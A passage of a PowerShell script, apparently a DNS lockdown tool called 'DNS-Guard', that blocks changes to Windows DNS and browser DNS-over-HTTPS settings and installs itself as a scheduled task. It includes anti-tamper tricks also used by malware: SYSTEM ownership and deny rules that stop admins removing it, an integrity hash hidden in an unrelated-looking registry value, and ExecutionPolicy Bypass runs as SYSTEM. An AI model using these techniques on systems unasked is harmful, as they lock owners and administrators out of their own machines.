    # Check Real-Time GPO Enforcement (each policy checked independently)
    $GpoEnforced = $true

    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if (-not $NetConn -or $NetConn.NC_LanProperties -ne 0) { $GpoEnforced = $false }

    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -ne "off") { $GpoEnforced = $false }

    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -ne "off") { $GpoEnforced = $false }

    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -ne 0) { $GpoEnforced = $false }

    if ($GpoEnforced) {
        Write-Host "  [X] GPO Restrictions   -> ENFORCED (Browsers & GUI)" -ForegroundColor Red
    } else {
        Write-Host "  [ ] GPO Restrictions   -> NOT ENFORCED" -ForegroundColor Green
        $AllLocked = $false # System isn't fully secure if GPOs are missing
    }

    # Check Service Installation Status
    $TaskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    $CmdExists = Test-Path $CmdPath

    if ($TaskExists -and $CmdExists) {
        Write-Host "  [X] Background Service -> INSTALLED ('dnslock' active)" -ForegroundColor Cyan
    } else {
        Write-Host "  [ ] Background Service -> NOT INSTALLED" -ForegroundColor DarkGray
    }

    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # --- 3. INTEGRITY CHECK ---
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " INTEGRITY CHECK " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray
    if (Test-Path $InstallScript) {
        $ExpectedHash = $null
        try { $ExpectedHash = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings" -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}
        if (-not $ExpectedHash -and (Test-Path (Join-Path $InstallDir "integrity.sha256"))) {
            $ExpectedHash = Get-Content -Path (Join-Path $InstallDir "integrity.sha256") -Raw
        }
        if ($ExpectedHash) {
            $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
            if ($ExpectedHash.Trim() -eq $ActualHash.Trim()) {
                Write-Host "  [X] Script Integrity    -> VERIFIED" -ForegroundColor Green
            } else {
                Write-Host "  [ ] Script Integrity    -> TAMPER DETECTED" -ForegroundColor Red
                Write-Host "`n  >>> TAMPER DETECTED! ACTION REQUIRED <<<" -ForegroundColor Black -BackgroundColor Yellow
                Write-Host "  - Run a full antivirus scan immediately." -ForegroundColor Yellow
                Write-Host "  - Do NOT use options [1] or [2] (they may run malicious code)." -ForegroundColor Yellow
                Write-Host "  - Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
                Write-Host "`n  HOW TO CHECK FOR MALICIOUS TASKS:" -ForegroundColor Cyan
                Write-Host "  1. Press Win + R, type: taskschd.msc  (press Enter)" -ForegroundColor White
                Write-Host "  2. Click 'Task Scheduler Library' on the left" -ForegroundColor White
                Write-Host "  3. Look for tasks you don't recognize (sort by Author)" -ForegroundColor White
                Write-Host "  4. Double-click suspicious tasks, check the 'Actions' tab" -ForegroundColor White
                Write-Host "  5. Delete anything running powershell/cmd from weird paths" -ForegroundColor White
                Write-Host "`n  QUICK POWERShell CHECK (run as admin):" -ForegroundColor Cyan
                Write-Host "  Get-ScheduledTask | Where-Object {`$_.TaskPath -eq '\' -and `$_.Author -notmatch 'Microsoft'} | Select-Object TaskName, Author, State" -ForegroundColor White
            }
        } else {
            Write-Host "  [ ] Script Integrity    -> NO BASELINE" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "  [ ] Script Integrity    -> NOT INSTALLED" -ForegroundColor DarkGray
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # Master Status Banner Logic
    if ($AllLocked -and $GpoEnforced) { 
        Write-Host " >>> SYSTEM IS SECURE: ZERO-TRUST PADLOCK ACTIVE <<< " -ForegroundColor White -BackgroundColor DarkRed 
    } elseif ($AnyLocked -or $GpoEnforced) {
        Write-Host " >>> SYSTEM IS PARTIALLY SECURE: MIXED STATE <<< " -ForegroundColor Black -BackgroundColor Yellow 
    } else { 
        Write-Host " >>> SYSTEM IS UNSECURE: PADLOCK INACTIVE <<< " -ForegroundColor White -BackgroundColor DarkGreen 
    }
    
    return $AllLocked
}

function Test-IntegrityStatus {
    # Returns $true if installed and hash matches; $false if tampered; $null if not installed
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    if (-not (Test-Path $InstallScript)) { return $null }
    $ExpectedHash = $null
    try { $ExpectedHash = (Get-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}
    if (-not $ExpectedHash -and (Test-Path $IntegrityFile)) { $ExpectedHash = Get-Content -Path $IntegrityFile -Raw }
    if (-not $ExpectedHash) { return $null }
    $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
    return ($ExpectedHash.Trim() -eq $ActualHash.Trim())
}

function Harden-RegistryKey {
    param(
        [string]$Path,
        [switch]$IsCurrentUser
    )
    try {
        $Hive = if ($IsCurrentUser) { [Microsoft.Win32.Registry]::CurrentUser } else { [Microsoft.Win32.Registry]::LocalMachine }
        $SubKeyPath = $Path -replace '^HKLM:\\' -replace '^HKCU:\\'
        
        $RegKey = $Hive.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        if (-not $RegKey) { 
            Write-Log -Message "Registry key not found for hardening: $Path" -Type "WARN" -Color Yellow
            return $false 
        }
        
        $Acl = $RegKey.GetAccessControl()
        
        # Remove inheritance (convert inherited to explicit)
        $Acl.SetAccessRuleProtection($true, $true)
        
        # Remove existing deny rules for the SIDs we will harden
        $RulesToRemove = @()
        foreach ($Rule in $Acl.Access) {
            if ($Rule.AccessControlType -eq "Deny") {
                try {
                    $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                    if ($RuleSid.Value -in @("S-1-5-32-544", "S-1-1-0", "S-1-5-11", "S-1-5-18")) {
                        $RulesToRemove += $Rule
                    }
                } catch {}
            }
        }
        foreach ($Rule in $RulesToRemove) {
            $Acl.RemoveAccessRule($Rule) | Out-Null
        }
        
        # Deny Admins dangerous rights
        $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "SetValue,CreateSubkey,Delete,WriteKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Deny Everyone
        $SidEveryone = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
        $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidEveryone, "SetValue,CreateSubkey,Delete,WriteKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Deny Authenticated Users
        $SidAuthUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
        $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAuthUsers, "SetValue,CreateSubkey,Delete,WriteKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        $RegKey.SetAccessControl($Acl)
        $RegKey.Close()
        Write-Log -Message "Hardened registry key: $Path" -Type "SUCCESS" -Color Green
        return $true
    } catch {
        Write-Log -Message "Failed to harden registry key $Path`: $_" -Type "WARN" -Color Yellow
        return $false
    }
}

function Restore-RegistryKey {
    param(
        [string]$Path,
        [switch]$IsCurrentUser
    )
    try {
        $Hive = if ($IsCurrentUser) { [Microsoft.Win32.Registry]::CurrentUser } else { [Microsoft.Win32.Registry]::LocalMachine }
        $SubKeyPath = $Path -replace '^HKLM:\\' -replace '^HKCU:\\'
        
        $RegKey = $Hive.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        if (-not $RegKey) { return $false }
        
        $Acl = $RegKey.GetAccessControl()
        
        # Remove deny rules for Admin, Everyone, Authenticated Users, and SYSTEM
        $RulesToRemove = @()
        foreach ($Rule in $Acl.Access) {
            if ($Rule.AccessControlType -eq "Deny") {
                try {
                    $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                    if ($RuleSid.Value -in @("S-1-5-32-544", "S-1-1-0", "S-1-5-11", "S-1-5-18")) {
                        $RulesToRemove += $Rule
                    }
                } catch {}
            }
        }
        
        foreach ($Rule in $RulesToRemove) {
            $Acl.RemoveAccessRule($Rule) | Out-Null
        }
        
        # Re-enable inheritance
        $Acl.SetAccessRuleProtection($false, $false)
        
        $RegKey.SetAccessControl($Acl)
        $RegKey.Close()
        Write-Log -Message "Restored registry key: $Path" -Type "SUCCESS" -Color Green
        return $true
    } catch {
        Write-Log -Message "Direct restore failed for $Path`: $_" -Type "WARN" -Color Yellow
        $FallbackScript = "C:\Windows\Temp\RestoreReg_$([Guid]::NewGuid().ToString()).ps1"
        $PsCode = "try { `$k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('$SubKeyPath', [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions); if (`$k) { `$a = `$k.GetAccessControl(); foreach (`$r in `$a.Access) { if (`$r.AccessControlType -eq 'Deny') { try { `$sid = `$r.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]); if (`$sid.Value -in @('S-1-5-32-544','S-1-1-0','S-1-5-11','S-1-5-18')) { [void]`$a.RemoveAccessRule(`$r) } } catch {} } }; `$a.SetAccessRuleProtection(`$false,`$false); `$k.SetAccessControl(`$a); `$k.Close(); exit 0 } else { exit 1 } } catch { exit 1 }"
        Set-Content -Path $FallbackScript -Value $PsCode -Encoding UTF8 -Force
        $Result = Invoke-AsSystem -Command "powershell.exe -ExecutionPolicy Bypass -File `"$FallbackScript`""
        Remove-Item -Path $FallbackScript -Force -ErrorAction SilentlyContinue
        if ($Result.Success) {
            Write-Log -Message "Restored registry key via SYSTEM: $Path" -Type "SUCCESS" -Color Green
            return $true
        } else {
            Write-Log -Message "Failed to restore registry key via SYSTEM: $Path. Output: $($Result.Output)" -Type "WARN" -Color Yellow
            return $false
        }
    }
}

# ============================================================================
# 4. LOCKDOWN MODULE (ENABLE)
# ============================================================================

function Enable-DNSLock {
    Write-DebugLog -FunctionName "Enable-DNSLock" -Action "ENTRY"
    Write-Log -Message "Initiating Targeted Lock (Admin/SYSTEM Only on IPv4 & IPv6)..." -Type "ACTION" -Color Magenta

    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }

            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()

                    $Rule1 = New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "SetValue", "Deny")
                    $Rule2 = New-Object System.Security.AccessControl.RegistryAccessRule($SidSystem, "SetValue", "Deny")

                    $Acl.AddAccessRule($Rule1)
                    $Acl.AddAccessRule($Rule2)

                    $RegKey.SetAccessControl($Acl)
                    Write-Log -Message "Applied lock ($Proto) for adapter: $($Adapter.Name)" -Type "SUCCESS" -Color Green

                    # Only print raw output if we aren't running silently in the background
                    if (-not $SilentLock) {
                        Write-Host "  > [RAW ACL DUMP FOR $($Adapter.Name) - $Proto]" -ForegroundColor DarkGray
                        $RegKey.GetAccessControl().Access | Where-Object { $_.AccessControlType -eq 'Deny' } | Format-Table IdentityReference, AccessControlType, RegistryRights -AutoSize | Out-String | Write-Host -ForegroundColor DarkGray
                    }
                    $RegKey.Close()
                }
            } catch {
                Write-Log -Message "Failed to lock $Proto adapter $($Adapter.Name)." -Type "ERROR" -Color Red
            }
        }
    }

    Write-Log -Message "Applying visual GPO restrictions..." -Type "INFO" -Color Yellow
    if (-not (Test-Path $GpoPath)) { New-Item -Path $GpoPath -Force -ErrorAction SilentlyContinue | Out-Null }
    Set-ItemProperty -Path $GpoPath -Name "NC_LanProperties" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $GpoPath -Name "NC_LanChangeProperties" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $GpoPath -Name "NC_AllowAdvancedTCPIPConfig" -Value 0 -Force -ErrorAction SilentlyContinue

    Write-Log -Message "Enforcing Browser DoH Restrictions (Edge, Chrome, Firefox)..." -Type "INFO" -Color Yellow
    # Edge
    if (!(Test-Path $EdgePath)) { New-Item -Path $EdgePath -Force | Out-Null }
    Set-ItemProperty -Path $EdgePath -Name "DnsOverHttpsMode" -Value "off" -Force
    Set-ItemProperty -Path $EdgePath -Name "BuiltInDnsClientEnabled" -Value 0 -Force
    # Chrome
    if (!(Test-Path $ChromePath)) { New-Item -Path $ChromePath -Force | Out-Null }
    Set-ItemProperty -Path $ChromePath -Name "DnsOverHttpsMode" -Value "off" -Force
    # Firefox
    if (!(Test-Path $FirefoxPath)) { New-Item -Path $FirefoxPath -Force | Out-Null }
    Set-ItemProperty -Path $FirefoxPath -Name "Enabled" -Value 0 -Force

    Write-Log -Message "Resetting Network Stack..." -Type "INFO" -Color Yellow
    ipconfig /flushdns | Out-Null

    # Only force DHCP renewal during interactive runs; avoid network disruption in background task
    if (-not $SilentLock) {
        ipconfig /renew | Out-Null
        Write-Log -Message "Protection deployed. DHCP Lease Renewal Successful!" -Type "SUCCESS" -Color Green
    } else {
        Write-Log -Message "Protection deployed silently (no DHCP renewal in background task)." -Type "SUCCESS" -Color Green
    }

    # Harden registry ACLs to prevent tampering
    Write-Log -Message "Hardening registry ACLs to prevent tampering..." -Type "INFO" -Color Yellow
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid"
        Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
    }
    $null = Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    $null = Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters"
    $null = Harden-RegistryKey -Path "Software\Policies\Microsoft\Windows\Network Connections" -IsCurrentUser
    $null = Harden-RegistryKey -Path "SOFTWARE\Policies\Microsoft\Edge"
    $null = Harden-RegistryKey -Path "SOFTWARE\Policies\Google\Chrome"
    $null = Harden-RegistryKey -Path "SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

    # Final status verification
    $FailedCount = 0
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    $HasDeny = $false
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny" -and $Rule.RegistryRights -like "*SetValue*") { $HasDeny = $true }
                        } catch {}
                    }
                    if (-not $HasDeny) { $FailedCount++; Write-Log -Message "Lock missing for adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
                    $RegKey.Close()
                }
            } catch { $FailedCount++; Write-Log -Message "Could not verify lock for adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
        }
    }
    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if (-not $NetConn -or $NetConn.NC_LanProperties -ne 0) { $FailedCount++; Write-Log -Message "GPO NC_LanProperties not enforced." -Type "ERROR" -Color Red }
    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -ne "off") { $FailedCount++; Write-Log -Message "Edge DoH not disabled." -Type "ERROR" -Color Red }
    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -ne "off") { $FailedCount++; Write-Log -Message "Chrome DoH not disabled." -Type "ERROR" -Color Red }
    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -ne 0) { $FailedCount++; Write-Log -Message "Firefox DoH not disabled." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] ALL DNS LOCKS DEPLOYED!" -ForegroundColor Green
        Write-DebugLog -FunctionName "Enable-DNSLock" -Action "EXIT" -Message "Success, FailedCount=0"
    } else {
        Write-Host "[PARTIAL] DNS LOCKS DEPLOYED WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
        Write-DebugLog -FunctionName "Enable-DNSLock" -Action "EXIT" -Message "Partial, FailedCount=$FailedCount"
    }
}

# ============================================================================
# 5. UNLOCK MODULE (DISABLE / ÅNGRA)
# ============================================================================

function Disable-DNSLock {
    Write-DebugLog -FunctionName "Disable-DNSLock" -Action "ENTRY"
    Write-Log -Message "Initiating Total Unlock (Ångra)..." -Type "ACTION" -Color Magenta

    # Restore hardened registry ACLs before attempting to modify values
    Write-Log -Message "Restoring hardened registry ACLs..." -Type "INFO" -Color Yellow
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $null = Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid"
        $null = Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
    }
    $null = Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    $null = Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters"
    $null = Restore-RegistryKey -Path "Software\Policies\Microsoft\Windows\Network Connections" -IsCurrentUser
    $null = Restore-RegistryKey -Path "SOFTWARE\Policies\Microsoft\Edge"
    $null = Restore-RegistryKey -Path "SOFTWARE\Policies\Google\Chrome"
    $null = Restore-RegistryKey -Path "SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }

            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    $RulesToRemove = @()

                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            # Remove locks for Admin, SYSTEM, AND the old Everyone rule just in case it was left behind
                            if (($RuleSid.Value -eq "S-1-5-32-544" -or $RuleSid.Value -eq "S-1-5-18" -or $RuleSid.Value -eq "S-1-1-0") -and $Rule.AccessControlType -eq "Deny") {
                                $RulesToRemove += $Rule
                            }
                        } catch {}
                    }

                    if ($RulesToRemove.Count -gt 0) {
                        foreach ($Rule in $RulesToRemove) { $Acl.RemoveAccessRule($Rule) }
                        $RegKey.SetAccessControl($Acl)
                        Write-Log -Message "Stripped Deny rules ($Proto) for adapter: $($Adapter.Name)" -Type "SUCCESS" -Color Green
                    }
                    $RegKey.Close()
                }
            } catch {
                Write-Log -Message "Failed to read $Proto adapter $($Adapter.Name)." -Type "ERROR" -Color Red
            }
        }
    }

    Write-Log -Message "Removing visual GPO restrictions..." -Type "INFO" -Color Yellow
    if (Test-Path $GpoPath) {
        Remove-ItemProperty -Path $GpoPath -Name "NC_LanProperties" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $GpoPath -Name "NC_LanChangeProperties" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $GpoPath -Name "NC_AllowAdvancedTCPIPConfig" -ErrorAction SilentlyContinue
    }

    Write-Log -Message "Removing Browser DoH Restrictions (Edge, Chrome, Firefox)..." -Type "INFO" -Color Yellow
    if (Test-Path $EdgePath) {
        Remove-ItemProperty -Path $EdgePath -Name "DnsOverHttpsMode" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $EdgePath -Name "BuiltInDnsClientEnabled" -ErrorAction SilentlyContinue
    }
    if (Test-Path $ChromePath) { Remove-ItemProperty -Path $ChromePath -Name "DnsOverHttpsMode" -ErrorAction SilentlyContinue }
    if (Test-Path $FirefoxPath) { Remove-ItemProperty -Path $FirefoxPath -Name "Enabled" -ErrorAction SilentlyContinue }

    ipconfig /flushdns | Out-Null

    Write-Log -Message "System restored to default Windows behaviors." -Type "SUCCESS" -Color Green
    Write-DebugLog -FunctionName "Disable-DNSLock" -Action "EXIT" -Message "Success"

    # Final status verification
    $FailedCount = 0
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny") { $FailedCount++; Write-Log -Message "Lock still present on adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
                        } catch {}
                    }
                    $RegKey.Close()
                }
            } catch { Write-Log -Message "Could not verify unlock for adapter $($Adapter.Name) ($Proto)." -Type "WARN" -Color Yellow }
        }
    }
    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if ($NetConn -and $NetConn.NC_LanProperties -eq 0) { $FailedCount++; Write-Log -Message "GPO NC_LanProperties still enforced." -Type "ERROR" -Color Red }
    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -eq "off") { $FailedCount++; Write-Log -Message "Edge DoH still disabled." -Type "ERROR" -Color Red }
    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -eq "off") { $FailedCount++; Write-Log -Message "Chrome DoH still disabled." -Type "ERROR" -Color Red }
    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -eq 0) { $FailedCount++; Write-Log -Message "Firefox DoH still disabled." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] ALL DNS LOCKS REMOVED!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] DNS LOCKS REMOVED WITH ERRORS! ($FailedCount items still locked)" -ForegroundColor Yellow
    }
}

# ============================================================================
# 6. INSTALLER / PERSISTENCE MODULE (HARDENED)
# ============================================================================

function Install-Persistence {
    Write-DebugLog -FunctionName "Install-Persistence" -Action "ENTRY"
    Export-RawDebugDump -Trigger "DNS_INSTALL_START"
    Write-Log -Message "Installing DNS-Guard to System ($InstallDir)..." -Type "ACTION" -Color Yellow

    # 0. Installation Gate: Prevent overwriting existing installs
    if (Test-Path $InstallDir) {
        Write-Log -Message "Installation aborted: $InstallDir already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] DNS-Guard is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Write-Log -Message "Installation aborted: Scheduled task '$TaskName' already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] DNS-Guard is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    
    # 1. Secure Copy
    if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
    Copy-Item -Path $PSCommandPath -Destination $InstallScript -Force
    Write-Log -Message "Payload copied to $InstallScript." -Type "INFO" -Color Gray

    # Pre-build wrapper content and create all files inside $InstallDir BEFORE hardening ACLs
    $CmdBatContent = "@echo off`r`nC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$InstallScript`" %*"
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    Out-File -FilePath $CmdPathLocal -InputObject $CmdBatContent -Encoding ASCII -Force
    Write-Log -Message "Local wrapper created at $CmdPathLocal." -Type "INFO" -Color Gray

    # Pre-calculate integrity hash and write backup file before hardening
    $ScriptHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    Set-Content -Path $IntegrityFile -Value $ScriptHash -Encoding UTF8 -Force
    Write-Log -Message "Self-integrity hash file written." -Type "INFO" -Color Gray
    
    # --- [NEW] NTFS PAYLOAD SELF-DEFENSE ---
    Write-Log -Message "Hardening NTFS Permissions on installation directory and files..." -Type "INFO" -Color Yellow
    try {
        $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")

        # Set owner to SYSTEM on directory and all existing files (prevents admin takeown)
        $DirAcl = Get-Acl -Path $InstallDir
        $DirAcl.SetOwner($SidSystem)
        Set-Acl -Path $InstallDir -AclObject $DirAcl
        Get-ChildItem -Path $InstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetOwner($SidSystem)
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }

        # Harden directory ACL
        $DirAcl = Get-Acl -Path $InstallDir
        $DirAcl.SetAccessRuleProtection($true, $false)
        $DirAcl.Access | ForEach-Object { $DirAcl.RemoveAccessRule($_) | Out-Null }
        
        # SYSTEM: FullControl
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
        
        # Admins: ReadAndExecute only (cannot delete, modify, or change permissions)
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Authenticated Users: ReadAndExecute
